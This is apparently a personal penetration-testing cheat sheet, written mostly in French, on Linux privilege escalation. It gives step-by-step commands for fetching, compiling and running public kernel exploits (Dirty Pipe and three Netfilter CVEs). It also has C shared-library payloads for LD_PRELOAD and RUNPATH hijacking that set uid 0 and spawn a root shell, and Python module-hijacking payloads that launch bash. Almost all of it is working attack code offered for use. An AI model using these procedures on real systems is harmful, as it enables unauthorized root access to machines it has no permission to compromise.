
- [ ] [[#Kernel Exploits]]
- [ ] [[#Shared Libraries (DLL)]]
- [ ] [[#Python Library Hijacking (SUID / Sudo)]]
- [ ] [[#Python Module CVEs]]
- [ ] [[#Netfilter]]

# Kernel Exploits

- [[#Dirty Pipe ([CVE-2022-0847](https //cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847))|Dirty Pipe]]
- 


1. Identifier la version du kernel

```shell
uname -r
```

 (DirtyPipe / DirtyCow?)

## Dirty Pipe ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847))

> [!TIP]
> Versions `5.8`¬†√†¬†`5.17`

https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

```shell
bash compile.sh
```

¬†(`exploit-1`) modifies the¬†`/etc/passwd`

```shell
./exploit-1
```


(`exploit-2`) execute SUID binaries with root privileges

```shell
find / -perm -4000 2>/dev/null
```

```shell
./exploit-2 /usr/bin/sudo
```


---
# Shared Libraries (DLL)

- [[#LD_PRELOAD (Sudo)]]
- [[#Shared Object Hijacking (SUID / Sudo)]]


2 types de lib:
- static libraries (.a)
- dynamically linked shared object libraries (.so) -> equivalent aux dll windows...


Afficher les dll (.so) appel√©es par un binaire

```shell
ldd /bin/ls
```


## LD_PRELOAD (Sudo)

> [!TIP]
> Permet de charger une dll avant d'executer un binaire

1. Identifier (env_keep+=LD_PRELOAD) avec le sudo

```bash
sudo -l
```

2. Cr√©er une librairie partag√©e en c
lib.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

3. Compiler la lib

```
gcc -fPIC -shared -o lib.so lib.c -nostartfiles
```

4. Ex√©cuter un binaire en chargeant la lib malveillante (pr√©ciser absolute path)

```
sudo LD_PRELOAD=/tmp/lib.so <binaire>
```


## Shared Object Hijacking (SUID / Sudo)

> [!TIP]
> Tant que la lib malveillante est dans le runpath elle sera execut√©e.


1. Afficher les dll (.so) appel√©es par un binaire et identifier des libs custom (path diff√©rent)

```shell
ldd <programme>
```

2. V√©rifier RUNPATH (prend le pas sur les autres folders de libs)

```shell
readelf -d <programme> | grep PATH
```

3. V√©rifier si possible d'√©crire dans le librairie runpath

```shell-session
ls -la /<runpath>/
```

4. SI BESOIN identifier les fonctions n√©cessaires au chargement de la lib (mettre une autre lib avec le m√™me nom pour g√©n√©rer une erreur)

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /<runpath>/<lib>.so
```

5. Cr√©er lib malveillante avec la fonction n√©cessaire

lib.c
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void <fonction>() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/bash -p");
} 
```

6. Compiler la lib dans le runpath

```shell-session
gcc lib.c -fPIC -shared -o /<runpath>/<lib>.so
```

7. Executer le binaire

```shell-session
./<programme> 
```

---
# Python Library Hijacking (SUID / Sudo)

> [!TIP]
> Possible de modifier le script directement ?
> Possible de modifier un module d'une librairie ?


> [!warning]
> Si possible d'√©crire dans le r√©pertoire ou se situe le script -> Cr√©er un module dans le r√©pertoire et il sera execut√© avant le pyhtonpath

## üß≠ Ordre de recherche des modules en Python (`import`)

Quand Python ex√©cute `import module`, il cherche **dans cet ordre** :

1. **Le r√©pertoire courant** (o√π le script Python est lanc√©) ‚û°Ô∏è `""` dans `sys.path[0]`

2. **Les chemins list√©s dans `PYTHONPATH`** (si d√©finis dans l‚Äôenvironnement)

3. **Les r√©pertoires standards** de l‚Äôinstallation Python (ex: `/usr/lib/python3.11/`, `site-packages/`, etc.)

4. Les fichiers `.zip` si tu as des archives de modules dans les paths

5. Les modules int√©gr√©s (builtins)



- [ ] [[#Wrong write permission]]
- [ ] [[#Library Path]]
- [ ] [[#PYTHONPATH Environment Variable]]
- [ ] [[#Python Module CVEs]]

## Wrong write permission

1. Identifier les modules import√©s par le script

```
cat <script.py> | grep import
```

2. Identifier une fonction utilis√©e par le module dans le script

```
cat <script.py> | grep <module>.*
```

3. Identifier le path pour le module contenant la fonction

```shell
pip3 show <module>
```

```sh
grep -r "def <fonction>" /module/location
```

4. Identifier un fichier de module modifiable contenant la fonction 

```sh
ls -la /module/location
```

5. Ins√©rer payload dans la fonction du module

```python
	import os
	os.system('/bin/bash')
```

6. Executer le script python

```
python3 <script.py>
```


## Library Path

> [!Requis]
>  - Pouvoir ecrire dans un pythonpath
>  - Le module doit se trouver dans un python path dont la priorit√© est moindre que le pythonpath modifiable


1. Identifier les modules import√©s par le script

```
cat <script.py> | grep import
```

2. Lister les pythonpath

```shell
python3 -c 'import sys; print("\n".join(sys.path))'
```

3. Identifier le pythonpath du module √† hijacker (y a t il des pythonpath au dessus ?)

```bash
pip3 show <lib>
```

4. Identifier les droits sur les pythonpath au dessus

```
ls -la /pythonpath
```

5. Cr√©er module dans pythonpath modifiable avec la bonne fonction

module.py
```python
#!/usr/bin/env python3

import os

def <fonction>():
    os.system('/bin/bash')
```

## PYTHONPATH Environment Variable

> [!TIP]
> Possible de definir un autre python path et usurper les libs


1. Identifier SETENV: flag dans sudo

```shell-session
sudo -l 
```

2. Identifier les modules import√©s par le script

```
cat <script.py> | grep import
```

3. Cr√©er module malveillant dans /tmp
module.py
```python
#!/usr/bin/env python3

import os

def <fonction>():
    os.system('/bin/bash')
```

4. Definir /tmp comme pythonpath et executer le script python.

```shell
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```


---

# Python Module CVEs


1. Identifier les modules import√©s par le script

```
cat <script.py> | grep import
```

2. chercher des cves sur les modules import√©s

```bash
pip3 list | grep <module>
```


---

# Netfilter

> [!TIP]
> Kernel module qui permet le filtrage de paquet, transllation d'adresses etc...

3 fonctions principales:
- Packet defragmentation
- Connection tracking
- Network address translation (NAT)

 1.  Identifier la version du kernel
 
```
uname -r
```

- ver 2.6 √† 5.11 -> [[#CVE-2021-22555]]
- ver 5.4 √† 5.6.10 -> [[#CVE-2022-25636 (ver 5.4 √† 5.6.10)]]
- ver < 6.3.1 ->  [[#CVE-2023-32233 (ver < 6.3.1)]]


## CVE-2021-22555 (ver 2.6 √† 5.11)

```shell
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

```shell-session
gcc -m32 -static exploit.c -o exploit
```

```shell-session
./exploit
```

## CVE-2022-25636 (ver 5.4 √† 5.6.10)


```shell-session
git clone https://github.com/Bonfee/CVE-2022-25636.git
```

```shell-session
cd CVE-2022-25636
```

```shell-session
make
```

```shell-session
./exploit
```


## CVE-2023-32233 (ver < 6.3.1)

```shell-session
 git clone https://github.com/Liuk3r/CVE-2023-32233
```

```shell-session
cd CVE-2023-32233
```

```shell-session
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

```shell-session
./exploit
```